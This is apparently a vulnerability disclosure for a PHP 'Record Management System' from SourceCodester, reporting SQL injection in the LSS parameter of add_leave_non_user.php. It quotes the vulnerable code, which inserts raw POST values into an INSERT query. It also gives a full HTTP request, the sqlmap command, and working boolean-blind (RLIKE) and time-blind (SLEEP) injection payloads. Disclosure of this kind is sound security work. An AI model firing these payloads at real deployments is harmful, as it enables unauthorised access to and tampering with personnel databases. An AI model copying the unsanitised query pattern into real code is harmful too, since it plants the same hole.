### VUL_AUTHOR:netmanzhang
# Record Management System - SQL Injection on (add_leave_non_user.php LSS parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 

## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
add_leave_non_user.php 

On this page, LSS parameter is vulnerable to SQL Injection Attack 
## Source code(Personnel_record_management_system/add_leave_non_user.php):
```
$emp_id=$_POST['name'];
$from=$_POST['from'];
$to=$_POST['to'];
$LEV=$_POST['LEV'];
$LES=$_POST['LES'];
$LSV=$_POST['LSV'];
$LSS=$_POST['LSS'];
$LEV1=$_POST['LEV1'];
$BV1=$_POST['BV1'];
$LES1=$_POST['LES1'];
$BS1=$_POST['BS1'];
$BV=($LEV - $LSV) + ($BV1);
$BS=($LES - $LSS) + ($BS1);
$total=$BV+$BS;
mysqli_query($conn,"insert into service_credits (from_date,to_date,employeeID,LE_vacation,LE_sick,LS_vacation,LS_sick,B_vacation,B_sick,total) values('$from','$to','$emp_id','$LEV','$LES','$LSV','$LSS','$BV','$BS','$total')")or die(mysqli_error());
```
## Proof of vulnerability(Verify using the sqlmap tool):
### Request:
```
POST /Personnel_record_management_system/add_leave_non_user.php?id=103 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 212
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=52388hjgjeif4bl4r5sqp2bmpm
Origin: http://localhost
Referer: http://localhost/Personnel_record_management_system/add_leave_non_user.php?id=103
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

BS1=22850&BV1=17850&LES=1&LES1=100&LEV=1&LEV1=100&LSS=1&LSV=1&from=04%2F09%2F2024&name=103&save=&to=04%2F11%2F2024
```
#### -> sqlmap -r 1.txt(above request package) --batch
## Output:
```
---
Parameter: LSS (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: BS1=22850&BV1=17850&LES=1&LES1=100&LEV=1&LEV1=100&LSS=1' RLIKE (SELECT (CASE WHEN (4740=4740) THEN 1 ELSE 0x28 END)) AND 'eYWd'='eYWd&LSV=1&from=04/09/2024&name=103&save=&to=04/11/2024

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: BS1=22850&BV1=17850&LES=1&LES1=100&LEV=1&LEV1=100&LSS=1' AND (SELECT 4600 FROM (SELECT(SLEEP(5)))rqQs) AND 'RGto'='RGto&LSV=1&from=04/09/2024&name=103&save=&to=04/11/2024
---
```
